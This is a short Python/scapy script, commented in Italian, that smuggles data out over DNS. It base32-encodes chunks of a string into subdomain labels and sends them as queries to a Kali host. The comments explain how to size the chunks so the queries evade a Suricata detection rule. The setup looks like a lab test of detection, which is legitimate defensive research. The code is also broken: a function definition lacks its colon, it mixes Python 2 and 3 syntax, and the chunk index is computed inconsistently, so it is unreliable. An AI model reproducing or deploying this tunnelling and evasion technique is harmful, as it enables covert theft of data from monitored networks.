import base64
from scapy.all import *
import time

a=b"stringa molto lunga piu del previsto sara divisa in chunkz"
lista=[]
destport=53
dest="10.10.30.100" #kali
#la variabile n permette di definire la dimensione delle stringhe che verranno aggiunte al dominio di test.
#con 30 (o altri numeri sopra il 20 viene rilevato), altrimenti passa inosservato (la stringa nella regola suricata blocca qualsiasi query con argomento più lungo di 30 caratteri codificati in Base64)
n=30

def encode(a):
    dati=base64.b32encode(a)
    dati=dati.decode()
    dati=dati.rstrip("=").lower()
    return dati

def decode(a)
    dati=a
    dati=dati.upper()
    dati=dati+"="*((-len(a))%8)
    dati=base64.b32decode(dati)
    return dati

risultato=b""
for i in range(0,len(a),n):
    pezzo=a[i:i+n]
    label=encode(pezzo)
    indice=i//15
    lista.append(f"{indice}.{label}.test.lab")

print lista

for i in lista:
    pkt=IP(dst=dest)/UDP(dport=destport)/DNS(rd=1,qd=DNSQR(qname=i, qtype="A"))
    send(pkt)
    time.sleep(0.5)

    